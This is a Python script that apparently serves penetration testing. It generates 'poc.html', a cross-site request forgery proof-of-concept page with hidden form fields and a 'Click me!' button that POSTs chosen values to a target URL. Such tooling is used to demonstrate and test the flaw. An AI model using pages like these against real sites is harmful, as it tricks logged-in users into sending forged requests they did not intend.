def main():
    url = input("Enter location to POST to\n")
    data = input("Enter POST form data\n")
    
    filename = "poc.html"
    try:
        file = open(filename, 'x')
        file.close()
        file = open(filename, 'w')
        file.write("")
        file.close()
        file = open(filename, 'a+')
    except:
        file = open(filename, 'w')
        file.write("")
        file = open(filename, 'a+')

    file.write("<html>\n\t<body>\n\t\t<form action=\""+url+"\" method=\"POST\">")

    params = data.split("&")
    key_val = []
    param = 0
    while param < len(params):
        key_val.append(params[param].split("="))
        param+=1

    for sets in key_val:
        file.write("\n\t\t\t<input type=\"hidden\" name=\""+sets[0]+"\" value=\""+sets[1]+"\">")

    file.write("\n\t\t</form>")
    file.write("\n\t\t<button onclick=\"send()\">Click me!</button>")
    file.write("\n\t\t<script>")
    file.write("\n\t\t\tfunction send(){")
    file.write("\n\t\t\t\tdocument.forms[0].submit();")
    file.write("\n\t\t\t}")
    file.write("\n\t\t</script>")
    file.write("\n\t</body>")
    file.write("\n</html>")

    file.close()

main()
